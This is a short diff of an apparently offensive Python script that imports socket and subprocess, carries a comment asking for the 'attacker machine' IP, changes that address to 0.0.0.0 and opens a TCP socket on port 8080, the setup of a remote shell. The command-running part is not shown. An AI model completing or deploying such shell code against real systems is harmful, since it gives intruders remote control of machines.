@@ -1,7 +1,7 @@
 import socket
 import subprocess
 # Provide IP address of attacker machine
-ip="192.168.0.101"
+ip="0.0.0.0"
 port=8080
 s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
